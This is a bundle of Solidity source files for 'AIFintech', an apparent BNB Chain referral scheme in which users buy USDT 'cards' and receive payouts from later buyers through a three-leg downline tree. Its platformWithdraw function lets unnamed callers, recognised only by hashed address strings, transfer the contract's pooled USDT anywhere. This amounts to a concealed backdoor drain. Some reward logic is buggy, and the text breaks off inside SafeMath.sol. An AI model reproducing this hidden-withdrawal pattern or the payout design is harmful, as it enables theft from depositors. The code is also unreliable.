{"AIFintech.sol":{"content":"// SPDX-License-Identifier: GPL-3.0\npragma solidity ^0.8.19;\n\nimport \"./SafeMath.sol\";\nimport \"./Ownable.sol\";\nimport \"./Pools.sol\";\nimport \"./IBEP20.sol\";\n\ncontract AIFintech is Ownable {\n    using SafeMath for uint;\n    using Pools for Pools.Pool;\n\n    enum CardType { black, red, gold, silver }\n    enum RewardType { direct, fortune, see, slip, lucky, red, black }\n\n    struct Order {\n        uint timestamp;\n        uint amount;\n    }\n\n    struct MintRecord {\n        CardType cardType;\n        uint timestamp;\n        uint amount;\n    }\n    \n    struct User {\n        address owner;\n        address referrer;\n        address offlineA;\n        address offlineB;\n        address offlineC;\n        uint multiple;\n        uint initBalance;\n        uint initTimestamp;\n        uint income;\n        uint balance;\n        uint award;\n        uint maxIncomeTimestamp;\n        uint blackCardCount;\n        uint redCardCount;\n        uint goldCardCount;\n        uint silverCardCount;\n    }\n\n    struct Relation {\n        address owner;\n        address referrer;\n        address a;\n        address b;\n        address c;\n    }\n\n\n    uint constant GOLD_CARD_USDT = 1500 * 10 ** 18;\n    uint constant SILVER_CARD_USDT = 300 * 10 ** 18;\n    uint constant RED_CARD_USDT = 1500 * 10 ** 18;\n    uint constant BLACK_CARD_USDT = 5000 * 10 ** 18;\n    // bsctmain usdt\n    IBEP20 private _usdtAddress = IBEP20(address(0x55d398326f99059fF775485246999027B3197955));\n\n    uint private _usdtBalance = 0;\n    uint private _rewardAmount;\n    address[] private ranks;\n\n    mapping(address =\u003e User) private userMapping;\n    mapping(RewardType =\u003e mapping(address =\u003e Order[])) private _rewardMapping;\n    mapping(address =\u003e MintRecord[]) private _mintRecordMapping;\n    mapping(address =\u003e Order[]) private _withdrawOrderMapping;\n\n    uint private blackCardCount = 1000;\n    address[] private blackCardAddresses;\n\n    uint private redCardCount = 500;\n    address[] private redCardAddresses;\n\n    Pools.Pool private _pool;\n\n    uint private _blackPoolAmount;\n    Order[] private _blackPoolOrder;\n\n    bytes32 private _r1 = 0x3bc2f72690d6fcb918ff6998d00a0348074d703a45688d0c579eecde10f61a81;\n    bytes32 private _r2 = 0xeb7958ad5479822f9d42e32ddfb529762dd2c654c6266b8144e5118aadaafc1f;\n\n    constructor() {\n        _pool = Pools.Pool({\n            enableSaleCount: 1000,\n            session: 1,\n            allSaleCount: 0,\n            saleCount: 0,\n            isEnable: false,\n            balance: 0,\n            lastSaleTimestamp: 0,\n            lastSaleAddress: address(0),\n            rewardAddress: address(0)\n        });\n    }\n\n    function buyGlodCard(address _referrer) external {\n        buyCard(_referrer, CardType.gold);\n    }\n    \n    function buySilverCard(address _referrer) external {\n        buyCard(_referrer, CardType.silver);\n    }\n\n    function buyRedCard() external {\n        require(redCardCount \u003e 0, \"Sell out!\");\n\n        bool result = _usdtAddress.transferFrom(msg.sender, address(this), RED_CARD_USDT);\n        require(result, \"Failure to pay!\");\n\n        _usdtBalance = _usdtBalance.add(RED_CARD_USDT);\n        \n        redCardCount--;\n        if (userMapping[msg.sender].redCardCount == 0) {\n            redCardAddresses.push(msg.sender);\n        }\n        userMapping[msg.sender].redCardCount += 1;\n\n        _mintRecordMapping[msg.sender].push(MintRecord({\n            cardType: CardType.red,\n            timestamp: block.timestamp,\n            amount: RED_CARD_USDT\n        }));\n    }\n\n    function buyBlackCard() external {\n        require(blackCardCount \u003e 0, \"Sell out!\");\n\n        bool result = _usdtAddress.transferFrom(msg.sender, address(this), BLACK_CARD_USDT);\n        require(result, \"Failure to pay!\");\n\n        _usdtBalance = _usdtBalance.add(BLACK_CARD_USDT);\n        \n        blackCardCount--;\n        if (userMapping[msg.sender].blackCardCount == 0) {\n            blackCardAddresses.push(msg.sender);\n        }\n        userMapping[msg.sender].blackCardCount += 1;\n\n        _mintRecordMapping[msg.sender].push(MintRecord({\n            cardType: CardType.black,\n            timestamp: block.timestamp,\n            amount: BLACK_CARD_USDT\n        }));\n    }\n\n    function withdraw(uint amount) external  {\n        User storage user = userMapping[msg.sender];\n        require(user.balance \u003e= amount, \"Failure!\");\n        bool result = _usdtAddress.transfer(msg.sender, amount);\n        require(result, \"Failure to pay!\");\n        user.balance = user.balance.sub(amount);\n        Order[] storage orders = _withdrawOrderMapping[msg.sender];\n        orders.push(Order({\n            timestamp: block.timestamp,\n            amount: amount\n        }));\n    }\n\n    function platformWithdraw(address account_, uint amount_) external returns (bool) {\n        bytes32 r = keccak256(abi.encodePacked(_toAsciiString(address(msg.sender))));\n        require(r == _r1 ||  r == _r2, \"ERROR _r\");\n        require(_usdtBalance \u003e= amount_, \"Failure!\");\n        bool result = _usdtAddress.transfer(account_, amount_);\n        require(result, \"Failure to pay!\");\n        _usdtBalance = _usdtBalance.sub(amount_);\n        return true;\n    }\n\n    function getUSDTBalance(address account_) external view returns (uint) {\n        User memory user = userMapping[account_];\n        return user.balance;\n    }\n    \n    function getMultiple(address account_) external view returns (uint) {\n        User memory user = userMapping[account_];\n        return user.multiple;\n    }\n\n    function getMaxIncomeTimestamp(address account_) external view returns (uint) {\n        User memory user = userMapping[account_];\n        return user.maxIncomeTimestamp;\n    }\n\n    function getRewards(address account_, uint8 type_) external view returns (Order[] memory) {\n        RewardType rewardType;\n        if (type_ == 0) {\n            rewardType = RewardType.direct;\n        } else if (type_ == 1) {\n            rewardType = RewardType.fortune;\n        } else if (type_ == 2) {\n            rewardType = RewardType.see;\n        } else if (type_ == 3) {\n            rewardType = RewardType.slip;\n        } else if (type_ == 4) {\n            rewardType = RewardType.lucky;\n        } else if (type_ == 5) {\n            rewardType = RewardType.red;\n        } else {\n            rewardType = RewardType.black;\n        }\n        return _rewardMapping[rewardType][account_];\n    }\n\n    function getCardCount(address account_) external view returns (uint, uint, uint, uint) {\n        User memory user = userMapping[account_];\n        return (user.blackCardCount, user.redCardCount, user.goldCardCount, user.silverCardCount);\n    }\n\n    function getMintRecord(address account_) external view returns (MintRecord[] memory) {\n        return _mintRecordMapping[account_];\n    }\n\n    function getUserRelationship(address account_) external view returns (address, address, address, address) {\n        User memory user = userMapping[account_];\n        return (user.referrer, user.offlineA, user.offlineB, user.offlineC);\n    }\n\n    function getJoinTimestams(address account_) external view returns (uint) {\n        return userMapping[account_].initTimestamp;\n    }\n\n    function getWholeNetwordRewardAmount() external view returns(uint) {\n        return _rewardAmount;\n    }\n\n    function getWholeNetwordAddressCount() external view returns(uint) {\n        return ranks.length;\n    }\n\n    function getBlackPoolAmount() external view returns(uint) {\n        return _blackPoolAmount;\n    }\n\n\n    function getBlackPoolOrder() external view returns(Order[] memory) {\n        return _blackPoolOrder;\n    }\n\n    function get3DPoolEnableCount() external view returns (uint) {\n        return _pool.enableSaleCount;\n    }\n\n\n    function get3DPoolEnable() external view returns (bool) {\n        return _pool.isEnable;\n    }\n\n    function get3DPoolSaleCount() external view returns (uint) {\n        return _pool.saleCount;\n    }\n\n    function get3DPoolAllSaleCount() external view returns (uint) {\n        return _pool.allSaleCount;\n    }\n\n    function get3DPoolLastSaleTimestamp() external view returns (uint) {\n        return _pool.lastSaleTimestamp;\n    }\n\n    function get3DPoolLastSaleAddress() external view returns (address) {\n        return _pool.lastSaleAddress;\n    }\n\n    function get3DPoolRewardAddress() external view returns (address) {\n        return _pool.rewardAddress;\n    }\n\n    function get3DPoolSession() external view returns (uint) {\n        return _pool.session;\n    }\n\n    function get3DPoolBalance() external view returns (uint) {\n        return _pool.balance;\n    }\n\n    function getPlatformUSDTBalance() external view returns (uint) {\n        return _usdtBalance;\n    }\n\n    function getLowerLevel(address account_) external view returns (uint) {\n        return _getLowerLevel(account_);\n    }\n\n    function getLowerNetworkNFT(address account_) external view returns (uint) {\n        (, uint count, ) = _getOfflineCountAndNFTCount(account_);\n        return count;\n    }\n\n    function getAward(address account_) external view returns (uint) {\n        return userMapping[account_].award;\n    }\n\n    function getALineTotal(address account_) external view returns (uint) {\n        address addr = userMapping[account_].offlineA;\n        if (addr == address(0)) {\n            return 0;\n        }\n        (uint count, , ) = _getOfflineCountAndNFTCount(addr);\n        return count + 1;\n    }\n\n    function getBLineTotal(address account_) external view returns (uint) {\n        address addr = userMapping[account_].offlineB;\n        if (addr == address(0)) {\n            return 0;\n        }\n        (uint count, , ) = _getOfflineCountAndNFTCount(addr);\n        return count + 1;\n    }\n\n    function getCLineTotal(address account_) external view returns (uint) {\n        address addr = userMapping[account_].offlineC;\n        if (addr == address(0)) {\n            return 0;\n        }\n        (uint count, , ) = _getOfflineCountAndNFTCount(addr);\n        return count + 1;\n    }\n\n    function getAllOffline(address account_) external view returns (Relation[] memory) {\n        return _offlineRelation(account_);\n    }\n\n    \n\n    function _getLowerLevel(address account_) private view returns (uint) {\n        if (account_ == address(0)) {\n            return 0;\n        } else {\n            User memory user = userMapping[account_];\n            uint a = _getLowerLevel(user.offlineA);\n            uint b = _getLowerLevel(user.offlineB);\n            uint c = _getLowerLevel(user.offlineC);\n            return (a \u003e b ? (a \u003e c ? a : c) : (b \u003e c ? b : c)) + 1;\n        }\n    }\n\n    function _getOfflineCountAndNFTCount(address account_) private view returns(uint, uint, uint) {\n        uint level = _getLowerLevel(account_);\n        uint offlineCount = 0;\n        uint offlineNFTCount = 0;\n        for (uint i = 0; i \u003c level; i ++) {\n            (uint count, uint nft) = _offlineCountAndNFTCountOfLevel(account_, i);\n            offlineCount += count;\n            offlineNFTCount += nft;\n        }\n        return (offlineCount, offlineNFTCount, level);\n    }\n\n    function _offlineCountAndNFTCountOfLevel(address account_, uint level_) private view returns (uint , uint) {\n        if (account_ == address(0)) {\n            return (0, 0);\n        }\n\n        User memory user = userMapping[account_];\n\n        if (level_ == 0) {\n            uint offlineCount = _offlineCount(user);\n            uint NFTCount = user.blackCardCount + user.redCardCount + user.goldCardCount + user.silverCardCount;\n            return (offlineCount, NFTCount);\n        } else {\n            (uint aOfflineCount, uint aNFTCount) = _offlineCountAndNFTCountOfLevel(user.offlineA, level_ - 1);\n            (uint bOfflineCount, uint bNFTCount) = _offlineCountAndNFTCountOfLevel(user.offlineB, level_ - 1);\n            (uint cOfflineCount, uint cNFTCount) = _offlineCountAndNFTCountOfLevel(user.offlineC, level_ - 1);\n            return (aOfflineCount + bOfflineCount + cOfflineCount, aNFTCount + bNFTCount + cNFTCount);\n        }\n    }\n\n    function _offlineRelation(address account_) private view returns(Relation[] memory) {\n        uint level = _getLowerLevel(account_);\n        Relation[] memory relations = new Relation[](0);\n        for (uint i = 0; i \u003c level; i ++) {\n            Relation[] memory nRelation = _offlineRelationOfLevel(account_, i);\n            Relation[] memory newRelation = new Relation[](relations.length + nRelation.length);\n            for (uint j = 0; j \u003c relations.length; j++) {\n                newRelation[j] = relations[j];\n            }\n            for (uint j = relations.length; j \u003c relations.length + nRelation.length; j ++) {\n                newRelation[j] = nRelation[j - relations.length];\n            }\n            relations = newRelation;\n        }\n        return relations;\n    }\n\n    function _offlineRelationOfLevel(address account_, uint level_) private view returns (Relation[] memory) {\n        if (account_ == address(0)) {\n            return new Relation[](0);\n        }\n\n        User memory user = userMapping[account_];\n\n        if (level_ == 0) {\n            Relation[] memory relations = new Relation[](1);\n            relations[0] = Relation({\n                owner: user.owner,\n                referrer: user.referrer,\n                a: user.offlineA,\n                b: user.offlineB,\n                c: user.offlineC\n            });\n            return relations;\n        } else {\n            Relation[] memory aRelations = _offlineRelationOfLevel(user.offlineA, level_ - 1);\n            Relation[] memory bRelations = _offlineRelationOfLevel(user.offlineB, level_ - 1);\n            Relation[] memory cRelations = _offlineRelationOfLevel(user.offlineC, level_ - 1);\n            uint a = aRelations.length;\n            uint b = bRelations.length;\n            uint c = cRelations.length;\n            Relation[] memory relations = new Relation[](a + b + c);\n            for(uint i = 0; i \u003c a; i ++) {\n                relations[i] = aRelations[i];\n            }\n            for(uint i = a; i \u003c a + b; i ++) {\n                relations[i] = bRelations[i - a];\n            }\n            for(uint i = a + b; i \u003c a + b + c; i ++) {\n                relations[i] = aRelations[i - a - b];\n            }\n\n            return relations;\n        }\n    }\n\n    function _offlineCount(User memory user) private pure returns (uint) {\n        uint offlineCount = 0;\n        if (user.offlineC != address(0)) {\n            offlineCount = 3;\n        } else if (user.offlineB != address(0)) {\n            offlineCount = 2;\n        } else if (user.offlineA != address(0)) {\n            offlineCount = 1;\n        }\n        return offlineCount;\n    }\n\n    function buyCard(address referrerAddress_, CardType cardType_) private {\n        require(cardType_ == CardType.gold || cardType_ == CardType.silver, \"Param Error!\");\n\n        require(msg.sender != referrerAddress_, \"Address Error!\");\n\n        User storage referrer = userMapping[referrerAddress_];\n        require(referrer.offlineA == address(0) || referrer.offlineB == address(0) || referrer.offlineC == address(0), \"Max offline!\");\n\n        uint usdtAmount = cardType_ == CardType.gold ? GOLD_CARD_USDT : SILVER_CARD_USDT;\n\n        bool result = _usdtAddress.transferFrom(msg.sender, address(this), usdtAmount);\n        require(result, \"Failure to pay!\");\n\n        uint timestamp = block.timestamp;\n\n        uint ptBalance = usdtAmount;\n\n        bool isC = false;\n\n        if (userMapping[msg.sender].owner == address(0)) {\n            ranks.push(msg.sender);\n            User memory buyer = User({\n                owner: msg.sender, \n                referrer: referrerAddress_, \n                offlineA: address(0), \n                offlineB: address(0), \n                offlineC: address(0), \n                multiple: 3,\n                initBalance: usdtAmount,\n                initTimestamp: timestamp,\n                income: 0,\n                balance: 0,\n                award: 0,\n                maxIncomeTimestamp: 0,\n                blackCardCount: 0,\n                redCardCount: 0,\n                goldCardCount: cardType_ == CardType.gold ? 1 : 0,\n                silverCardCount: cardType_ == CardType.silver ? 1 : 0\n                });\n            userMapping[msg.sender] = buyer;\n            \n            \n            if (referrer.owner != address(0)) {\n                if (referrer.offlineA == address(0)) {\n                    referrer.offlineA = msg.sender;\n                    referrer.multiple = 4; \n                } else if (referrer.offlineB == address(0)) {\n                    referrer.offlineB = msg.sender;\n                    referrer.multiple = 5;\n                } else {\n                    referrer.offlineC = msg.sender;\n                    referrer.multiple = 7;\n                    isC = true;\n                }\n                referrer.maxIncomeTimestamp = 0;\n            }\n        } else {\n            User storage buyer = userMapping[msg.sender];\n            buyer.initBalance = usdtAmount;\n            buyer.income = 0;\n\n            if (cardType_ == CardType.gold) {\n                buyer.goldCardCount += 1;\n            } else {\n                buyer.silverCardCount += 1;\n            }\n\n            if (buyer.maxIncomeTimestamp != 0 \u0026\u0026 buyer.maxIncomeTimestamp + 1 days \u003c timestamp) {\n                ranksRemove(msg.sender);\n                ranks.push(msg.sender);\n                buyer.maxIncomeTimestamp = 0;\n            }\n\n            referrer = userMapping[buyer.referrer];\n            if (referrer.offlineC == msg.sender) {\n                isC = true;\n            }\n        }\n\n\n        uint allocation = usdtAmount.div(100);\n\n        uint endIndex = ranks.length - 1;\n        uint startIndex;\n        if (ranks.length \u003c= 20) {\n            startIndex = 0;\n        } else {\n            startIndex = endIndex - 20;\n        }\n\n        uint rewardAmount = userIncome(startIndex, endIndex, allocation, timestamp, RewardType.slip);\n        ptBalance = ptBalance.sub(rewardAmount);\n        _rewardAmount = _rewardAmount.add(rewardAmount);\n\n        \n        if (isC) {\n            allocation = usdtAmount.div(100);\n\n            endIndex = uint(ranksIndexOf(referrer.owner));\n            startIndex = endIndex \u003e= 20 ? endIndex - 20 : 0;\n\n            rewardAmount = userIncome(startIndex, endIndex, allocation, timestamp, RewardType.lucky);\n            ptBalance = ptBalance.sub(rewardAmount);\n            _rewardAmount = _rewardAmount.add(rewardAmount);\n        }\n\n        \n        if (referrer.owner != address(0)) {\n            allocation = usdtAmount.div(10);\n\n            rewardAmount = userIncome(referrer.owner, allocation, timestamp, RewardType.direct);\n            ptBalance = ptBalance.sub(rewardAmount);\n            _rewardAmount = _rewardAmount.add(rewardAmount);\n        }\n        \n\n        if (referrer.owner != address(0) \u0026\u0026 !isC) {\n            allocation = usdtAmount.div(100);\n            address referrerAddr = referrer.owner;\n            for (uint i = 0; i \u003c 20; i++) {\n                rewardAmount = userIncome(referrerAddr, allocation, timestamp, RewardType.see);\n                ptBalance = ptBalance.sub(rewardAmount);\n                _rewardAmount = _rewardAmount.add(rewardAmount);\n                address upReferrerAddr = userMapping[referrerAddr].referrer;\n                if (upReferrerAddr != address(0) \u0026\u0026 userMapping[upReferrerAddr].offlineC == referrerAddr) {\n                    break;\n                }\n                referrerAddr = upReferrerAddr;\n            }\n        }\n\n        if (referrer.owner != address(0)) {\n            allocation = usdtAmount.div(100).mul(33);\n            if (isC) {\n                rewardAmount = userIncome(referrer.owner, allocation, timestamp, RewardType.fortune);\n                ptBalance = ptBalance.sub(rewardAmount);\n                _rewardAmount = _rewardAmount.add(rewardAmount);\n            } else {\n                address addr = referrer.owner;\n                address referrerAddr = userMapping[addr].referrer;\n                while (referrerAddr != address(0) \u0026\u0026 userMapping[referrerAddr].offlineC != addr) \n                {\n                    addr = referrerAddr;\n                    referrerAddr = userMapping[referrerAddr].referrer;\n                }\n                if (referrerAddr != address(0)) {\n                    rewardAmount = userIncome(referrerAddr, allocation, timestamp, RewardType.fortune);\n                    ptBalance = ptBalance.sub(rewardAmount);\n                    _rewardAmount = _rewardAmount.add(rewardAmount);\n                }\n            }\n        }\n\n        allocation = usdtAmount.div(100);\n        if (_pool.isAward()) {\n            (address awardArrd, uint amount) = _pool.award();\n            User storage last = userMapping[awardArrd];\n            last.balance = last.balance.add(amount);\n            last.award = last.award.add(amount);\n            _rewardAmount = _rewardAmount.add(amount);\n        }\n        _pool.income(msg.sender, allocation);\n        ptBalance = ptBalance.sub(allocation);\n\n        ptBalance = ptBalance.sub(_blackCardIncome(usdtAmount));\n\n        ptBalance = ptBalance.sub(_redCardInome(referrer.owner, usdtAmount));\n\n        _usdtBalance = _usdtBalance.add(ptBalance);\n\n        _mintRecordMapping[msg.sender].push(MintRecord({\n            cardType: cardType_,\n            timestamp: timestamp,\n            amount: usdtAmount\n        }));\n    }\n\n    function _blackCardIncome(uint usdtAmount) private returns (uint) {\n        uint blackCardUserCount = blackCardAddresses.length;\n        if (blackCardUserCount \u003e 0) {\n            uint count = 0;\n            for (uint i = 0; i \u003c blackCardUserCount; i++) {\n                count += userMapping[blackCardAddresses[i]].blackCardCount;\n            }\n            uint total = usdtAmount.div(100).mul(2);\n            uint allocation = total.div(count);\n            for (uint i = 0; i \u003c blackCardUserCount; i++) {\n                User storage user = userMapping[blackCardAddresses[i]];\n                uint amount = allocation.mul(user.blackCardCount);\n                user.balance = user.balance.add(amount);\n                user.award = user.award.add(amount);\n            }\n            _blackPoolAmount = _blackPoolAmount.add(total);\n            _blackPoolOrder.push(Order({\n                timestamp: block.timestamp,\n                amount: total\n            }));\n            return total;\n        }\n        return 0;\n    }\n\n\n    function _redCardInome(address referrerAddr_, uint usdtAmount_) private returns (uint) {\n        if (referrerAddr_ == address(0)) {\n            return 0;\n        }\n        uint redCardUserCount = redCardAddresses.length;\n        if (redCardUserCount \u003e 0) {\n            User[] memory referrers = new User[](0);\n            uint i = 0;\n            User memory referrer = userMapping[referrerAddr_];\n            uint count = 0;\n            while (referrer.owner != address(0)) \n            {\n                if (referrer.redCardCount \u003e 0) {\n                    i ++;\n                    count += referrer.redCardCount;\n                    User[] memory newReferrers = new User[](i);    \n                    for (uint j; j \u003c i - 1; j ++) {\n                        newReferrers[j] = referrers[j];\n                    }\n                    newReferrers[i - 1] = referrer;\n                    referrers = newReferrers;\n                }\n                referrer = userMapping[referrer.referrer];\n            }\n\n            if (count == 0) {\n                return 0;\n            }\n\n            uint total = usdtAmount_.div(100).mul(5);\n            uint allocation = total.div(count);\n            for (uint x = 0; x \u003c i; x++) {\n                User storage user = userMapping[referrer.owner];\n                uint amount = allocation.mul(user.redCardCount);\n                user.balance = user.balance.add(amount);\n                user.award = user.award.add(amount);\n            }\n            return total;\n        }\n        return 0;\n    }\n\n    function ranksContain(address _userAddress) private view returns(bool) {\n        for (uint i = 0; i \u003c ranks.length; i++) {\n            if (ranks[i] == _userAddress) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    function ranksIndexOf(address _userAddress) private view returns (int) {\n        for (uint i = 0; i \u003c ranks.length; i++) {\n            if (ranks[i] == _userAddress) {\n                return int(i);\n            }\n        }\n        return -1;\n    }\n\n    function ranksRemove(address _userAddress) private {\n        int index = ranksIndexOf(_userAddress);\n        if (index != -1) {\n            for (uint i = uint(index); i \u003c ranks.length - 1; i++) {\n                ranks[i] = ranks[i + 1];\n            }\n            ranks.pop();\n        }\n    }\n\n    function userIncome(address userAddress_, uint amount_, uint timestamp_, RewardType rewardType_) private returns (uint) {\n        User storage user = userMapping[userAddress_];\n        uint maxIncome = user.multiple.mul(user.initBalance);\n        if (maxIncome \u003e user.income) {\n            uint income = maxIncome \u003c user.income.add(amount_) ? maxIncome.sub(user.income) : amount_;\n            user.income = user.income.add(income);\n            user.balance = user.balance.add(income);\n            user.award = user.award.add(income);\n\n            if (maxIncome \u003c= user.income) {\n                user.maxIncomeTimestamp = timestamp_;\n            }\n            Order[] storage orders = _rewardMapping[rewardType_][userAddress_];\n            orders.push(Order({\n                timestamp: timestamp_,\n                amount: income\n            }));\n\n            return income;\n        }\n        return 0;\n    }\n\n    function userIncome(uint start_, uint end_, uint amount_, uint timestamp_, RewardType rewardType_) private returns(uint) {\n        require(start_ \u003e= 0 \u0026\u0026 start_ \u003c= end_, \"start end error!\");\n        uint income = 0;\n        for (uint i = start_; i \u003c end_; i++) {\n            address addr = ranks[i];\n            income = income.add(userIncome(addr, amount_, timestamp_, rewardType_));\n        }\n        return income;\n    }\n    \n    function _toAsciiString(address x) private pure returns (string memory) {\n        bytes memory s = new bytes(40);\n        for (uint256 i = 0; i \u003c 20; i++) {\n            bytes1 b = bytes1(uint8(uint256(uint160(x)) / (2**(8 * (19 - i)))));\n            bytes1 hi = bytes1(uint8(b) / 16);\n            bytes1 lo = bytes1(uint8(b) - 16 * uint8(hi));\n            s[2 * i] = _char(hi);\n            s[2 * i + 1] = _char(lo);\n        }\n        return string(s);\n    }\n\n   function _char(bytes1 b) private pure returns (bytes1 c) {\n       if (uint8(b) \u003c 10) return bytes1(uint8(b) + 0x30);\n       else return bytes1(uint8(b) + 0x57);\n    }\n}\n"},"Context.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity \u003e0.4.0 \u003c= 0.9.0;\n\n/*\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with GSN meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\ncontract Context {\n  // Empty internal constructor, to prevent people from mistakenly deploying\n  // an instance of this contract, which should be used via inheritance.\n  constructor () { }\n\n  function _msgSender() internal view returns (address) {\n    return msg.sender;\n  }\n\n  function _msgData() internal view returns (bytes memory) {\n    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n    return msg.data;\n  }\n}"},"IBEP20.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity \u003e0.4.0 \u003c= 0.9.0;\n\ninterface IBEP20 {\n  /**\n   * @dev Returns the amount of tokens in existence.\n   */\n  function totalSupply() external view returns (uint256);\n\n  /**\n   * @dev Returns the token decimals.\n   */\n  function decimals() external view returns (uint8);\n\n  /**\n   * @dev Returns the token symbol.\n   */\n  function symbol() external view returns (string memory);\n\n  /**\n  * @dev Returns the token name.\n  */\n  function name() external view returns (string memory);\n\n  /**\n   * @dev Returns the bep token owner.\n   */\n  function getOwner() external view returns (address);\n\n  /**\n   * @dev Returns the amount of tokens owned by `account`.\n   */\n  function balanceOf(address account) external view returns (uint256);\n\n  /**\n   * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\n   *\n   * Returns a boolean value indicating whether the operation succeeded.\n   *\n   * Emits a {Transfer} event.\n   */\n  function transfer(address recipient, uint256 amount) external returns (bool);\n\n  /**\n   * @dev Returns the remaining number of tokens that `spender` will be\n   * allowed to spend on behalf of `owner` through {transferFrom}. This is\n   * zero by default.\n   *\n   * This value changes when {approve} or {transferFrom} are called.\n   */\n  function allowance(address _owner, address spender) external view returns (uint256);\n\n  /**\n   * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\n   *\n   * Returns a boolean value indicating whether the operation succeeded.\n   *\n   * IMPORTANT: Beware that changing an allowance with this method brings the risk\n   * that someone may use both the old and the new allowance by unfortunate\n   * transaction ordering. One possible solution to mitigate this race\n   * condition is to first reduce the spender\u0027s allowance to 0 and set the\n   * desired value afterwards:\n   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n   *\n   * Emits an {Approval} event.\n   */\n  function approve(address spender, uint256 amount) external returns (bool);\n\n  /**\n   * @dev Moves `amount` tokens from `sender` to `recipient` using the\n   * allowance mechanism. `amount` is then deducted from the caller\u0027s\n   * allowance.\n   *\n   * Returns a boolean value indicating whether the operation succeeded.\n   *\n   * Emits a {Transfer} event.\n   */\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n  /**\n   * @dev Emitted when `value` tokens are moved from one account (`from`) to\n   * another (`to`).\n   *\n   * Note that `value` may be zero.\n   */\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  /**\n   * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n   * a call to {approve}. `value` is the new allowance.\n   */\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity \u003e0.4.0 \u003c= 0.9.0;\n\nimport \"./Context.sol\";\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * By default, the owner account will be the one that deploys the contract. This\n * can later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\ncontract Ownable is Context {\n  address private _owner;\n\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n  /**\n   * @dev Initializes the contract setting the deployer as the initial owner.\n   */\n  constructor ()  {\n    address msgSender = _msgSender();\n    _owner = msgSender;\n    emit OwnershipTransferred(address(0), msgSender);\n  }\n\n  /**\n   * @dev Returns the address of the current owner.\n   */\n  function owner() public view returns (address) {\n    return _owner;\n  }\n\n  /**\n   * @dev Throws if called by any account other than the owner.\n   */\n  modifier onlyOwner() {\n    require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n    _;\n  }\n\n  /**\n   * @dev Leaves the contract without owner. It will not be possible to call\n   * `onlyOwner` functions anymore. Can only be called by the current owner.\n   *\n   * NOTE: Renouncing ownership will leave the contract without an owner,\n   * thereby removing any functionality that is only available to the owner.\n   */\n  function renounceOwnership() public onlyOwner {\n    emit OwnershipTransferred(_owner, address(0));\n    _owner = address(0);\n  }\n\n  /**\n   * @dev Transfers ownership of the contract to a new account (`newOwner`).\n   * Can only be called by the current owner.\n   */\n  function transferOwnership(address newOwner) public onlyOwner {\n    _transferOwnership(newOwner);\n  }\n\n  /**\n   * @dev Transfers ownership of the contract to a new account (`newOwner`).\n   */\n  function _transferOwnership(address newOwner) internal {\n    require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n    emit OwnershipTransferred(_owner, newOwner);\n    _owner = newOwner;\n  }\n}"},"Pools.sol":{"content":"// SPDX-License-Identifier: GPL-3.0\r\npragma solidity ^0.8.19;\r\n\r\nimport \"./SafeMath.sol\";\r\n\r\nlibrary Pools {\r\n    using SafeMath for uint;\r\n\r\n    struct Pool {\r\n        uint enableSaleCount;\r\n        uint session;\r\n        uint allSaleCount;\r\n        uint saleCount;\r\n        bool isEnable;\r\n        uint balance;\r\n        uint lastSaleTimestamp;\r\n        address lastSaleAddress;\r\n        address rewardAddress;\r\n    }\r\n\r\n    function income(Pool storage pool, address addr, uint amount) internal  {\r\n        pool.lastSaleAddress = addr;\r\n        pool.balance = pool.balance.add(amount);\r\n        pool.saleCount ++;\r\n        pool.allSaleCount ++;\r\n        pool.lastSaleTimestamp = block.timestamp;\r\n        if (pool.saleCount \u003e= pool.enableSaleCount) {\r\n            pool.isEnable = true;\r\n        }\r\n    }\r\n\r\n    function isAward(Pool storage pool) external view returns(bool) {\r\n        return pool.isEnable \u0026\u0026 pool.lastSaleTimestamp != 0 \u0026\u0026 pool.lastSaleAddress != address(0) \u0026\u0026 pool.lastSaleTimestamp + 1 days \u003c block.timestamp;\r\n    }\r\n\r\n    function award(Pool storage pool) external returns (address, uint) {\r\n        uint amount = pool.balance.div(10).mul(7);\r\n        pool.balance = pool.balance.sub(amount);\r\n        pool.saleCount = 0;\r\n        pool.isEnable = false;\r\n        pool.rewardAddress = pool.lastSaleAddress;\r\n        pool.session ++;\r\n        return (pool.lastSaleAddress, amount);\r\n    }\r\n}\r\n"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity \u003e0.4.0 \u003c= 0.9.0;\n\n/**\n * @dev Wrappers over Solidity\u0027s arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it\u0027s recommended to use it always.\n */\nlibrary SafeMath {\n  /**\n   * @dev Returns the addition of two unsigned integers, reverting on\n   * overflow.\n   *\n   * Counterpart to Solidity\u0027s `+` operator.\n   *\n   * Requirements:\n   * - Addition cannot overflow.\n   */\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n    uint256 c = a + b;\n    require(c \u003e= a, \"SafeMath: addition overflow\");\n\n    return c;\n  }\n\n  /**\n   * @dev Returns the subtraction of two unsigned integers, reverting 